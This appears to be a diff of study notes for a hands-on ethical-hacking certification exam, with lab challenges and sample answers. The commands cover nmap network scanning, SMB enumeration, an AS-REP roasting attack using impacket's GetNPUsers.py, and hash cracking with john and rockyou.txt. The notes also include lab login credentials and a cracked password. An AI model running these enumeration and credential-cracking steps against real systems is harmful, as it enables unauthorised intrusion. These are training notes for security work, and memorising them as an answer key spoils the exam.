@@ -7,6 +7,8 @@ TIPS to getting file share:
 -login using the window creds                                 Admin/Pa$$w0rd
 
 
+**** LOOK AT IP QUESTION CAREFULLY, NOT ALL ARE SAME IP QUESTIONS
+
 
 **PRACTICE** 1: (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
 An attacker conducted footprinting on a web application and saved the resulting report Dumpster.xlsx in the documents folder of EH Workstation-1. Your task is to analyze this report and identify the hostname associated with the IP address 173.245.59.176. (Format: aaaaa.aa.aaaaaaaaaa.aaa)
@@ -29,12 +31,15 @@ SAMPLE A: 192.168.10.111
 **Challenge 4:** (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
 Find the IP address of the Domain Controller machine in 192.168.0.0/24. (Format: NNN.NNN.N.NNN)
 - nmap -p 53 192.168.0.0/24 --open
+*** look for 64/TCP OPEN *DOMAIN*
+*** look for 88/TCP OPEN *KERBEROS-SEC*
 
 SAMPLE A: 192.168.0.222
 
 **Challenge 5:** (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
 Perform a host discovery scanning and identify the NetBIOS_Domain_Name of the host at 192.168.0.222. (Format: AAAAA.AAA)
 - nmap -sV -A 192.168.0.222
+*** Look for DNS_Domain_Name/DNS_Computer_Name:/DNS_Tree_Name:
 
 SAMPLE A: SKILL.CEH
 
@@ -47,20 +52,25 @@ SAMPLE A: SKILL.CEH.com
 **Challenge 7:** (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
 While performing a security assessment against the CEHORG network, you came to know that one machine in the network is running OpenSSH and is vulnerable. Identify the version of the OpenSSH running on the machine. Note: Target network 192.168.10.0/24. (Format: N.NaN)
 - nmap  -p  22  -sV 192.168.10.0/24 --open
-
+***LOOK for format of #.#x# / question may revolve around linux flavor
 SAMPLE A: 8.9p1
 
 **Challenge 8:** (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
 During a security assessment, it was found that a server was hosting a website that was susceptible to blind SQL injection attacks. Further investigation revealed that the underlying database management system of the site was MySQL. Determine the machine OS that hosted the database. Note: Target network 172.30.10.0/24 (Format: Aaaaaa)
 - nmap -p 3306 172.30.10.0/24 --open  ( you find the ip of host)
 - nmap -A 172.30.10.99
+*** 3306 = MYSQL / 1433 = MSSQL/MICROSOFT SQL SERVER
+*** LOOK FOR 3306 OPEN MYSQL (UNAUTHORIZED)
+*** Do not be thrown off by 1433
+*** Do not be thrown off by OS details/service info/OS Guesses
 
 SAMPLE A: Ubuntu 
 
 **Challenge 9:** (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
 Perform an intense scan on target subnet 192.168.10.0/24 and determine the IP address of the machine hosting the MSSQL database service. (Format: NNN.NNN.NN.NNN)
 - nmap -p 1433 192.168.10.0/24
-
+*** 3306 = MYSQL / 1433 = MSSQL/MICROSOFT SQL SERVER
+*** Look for 1077 OPEN MS-SQL-S / 1433O OPEN MS-SQL-S
 SAMPLE A: 192.168.10.144
 
 **Challenge 10:** (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
@@ -78,7 +88,7 @@ SAMPLE A: 172.30.10.200
 **Challenge 12:** (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
 Perform an SMB Enumeration on 172.30.10.200 and check whether the Message signing feature is required. Give your response as Yes/No.
 - nmap -p 445 -sV -A 172.30.10.200
-
+*** runing -p 445 should auto run script and look for smb2-security-mode results. Message sining enabled but required/not required
 SAMPLE A: No
 
 **Challenge 13:** (1. Footprinting Reconnaissance, Scanning Networks, Enumeration, Vuln Analysis)
@@ -172,14 +182,17 @@ SAMPLE A: 192.168.10.222
 **PRACTICE** 7: (2. System Hacking, Malware Threats, Sniffing, Social Engineering, Denial-of-Service)
 You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: aNaaN*NNN)
 
+**** You may have to nmap the previous example IP to get the domain name for the impacket scriptbelow:
+    "nmap -T5 -sV -A 192.168.10.222", domain will be shown under netbios_domain_name
 ****cd (in home likely) then cd impacket/examples is where the GetNPUsers.py will be located.
+**** You will need the user list so you can "CP GetNPUsers.py /home/attacker" if users.txt is stored here.
 - python3 GetNPUsers.py SKILL.CEH/ -no-pass -usersfile ~/users.txt -dc-ip 192.168.0.222
 - copy the hash from output and paste in a txt file a.txt
-- john --wordlist=rockyou.txt ~/a.txt
+- john --wordlist=rockyou.txt a.txt  *** assuming wordlist is rockyou and you created the A file in home/attacker
 
 SAMPLE A: c3ll0@123
  
-**PRACTICE** 8: (2. System Hacking, Malware Threats, Sniffing, Social Engineering, Denial-of-Service)
+**PRACTICE** 8: * Should practice (2. System Hacking, Malware Threats, Sniffing, Social Engineering, Denial-of-Service)
 A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: N)
 
 1.	scan all networks with open port 1433 | nmap -p 1433 192.168.10.0/24 --open
@@ -222,7 +235,7 @@ You are assigned to monitor a suspicious process running in a machine whose log 
 *** meterpreter > type: upload /path/to/Procmon64.exe C:\\Windows\\Temp\\Procmon64.exe
 
 - Copy that log file to windows
-- Install procmon.exe in the malware analysis folder
+- Install procmon.exe in the malware threats-> malware analysis->Dynamic malware analysis->process monitoring
 - open that file in procmon
 - Search H3II0 and double click to open. now you find the Paren PID
 
